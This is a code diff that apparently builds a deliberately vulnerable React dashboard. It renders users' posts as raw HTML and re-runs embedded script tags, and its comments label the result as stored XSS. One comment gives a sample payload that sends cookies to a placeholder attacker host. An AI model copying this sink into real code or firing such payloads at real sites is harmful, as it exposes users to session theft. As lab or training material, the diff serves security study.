@@ -1,5 +1,43 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { getPosts, updatePost } from "../api.js";
+
+// ==========================================================================
+// VULNERABILITY: Stored Cross-Site Scripting (XSS)
+// --------------------------------------------------------------------------
+// Each user's "post" (their public note) is treated as trusted HTML and
+// injected straight into the page with the raw `innerHTML` sink instead of
+// being rendered as escaped text. Anything a user types is parsed as live
+// markup and runs in every other visitor's browser.
+//
+// `innerHTML` normally will NOT execute <script> tags that it inserts, so we
+// walk the freshly-injected DOM and re-create each <script> node — this is
+// what lets a payload like:
+//     <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
+// actually fire when someone views the community feed.
+// ==========================================================================
+function RawHtml({ html, className }) {
+  const ref = useRef(null);
+
+  useEffect(() => {
+    const el = ref.current;
+    if (!el) return;
+
+    // Unsafe sink: user-controlled string dropped in as live HTML.
+    el.innerHTML = html || "";
+
+    // Re-inject <script> tags so they execute (innerHTML alone won't run them).
+    el.querySelectorAll("script").forEach((oldScript) => {
+      const newScript = document.createElement("script");
+      for (const attr of oldScript.attributes) {
+        newScript.setAttribute(attr.name, attr.value);
+      }
+      newScript.textContent = oldScript.textContent;
+      oldScript.replaceWith(newScript);
+    });
+  }, [html]);
+
+  return <div ref={ref} className={className} />;
+}
 
 export default function Dashboard({ user, onLogout }) {
   const [myPost, setMyPost] = useState(user.post || "");
@@ -209,13 +247,14 @@ export default function Dashboard({ user, onLogout }) {
                       </div>
                     </div>
 
-                    <p className="post-content">
-                      {item.post ? (
-                        item.post
-                      ) : (
+                    {item.post ? (
+                      // Renders the note as raw HTML — stored XSS sink.
+                      <RawHtml className="post-content" html={item.post} />
+                    ) : (
+                      <p className="post-content">
                         <em className="empty-post">No message set yet.</em>
-                      )}
-                    </p>
+                      </p>
+                    )}
                   </article>
                 ))}
             </div>
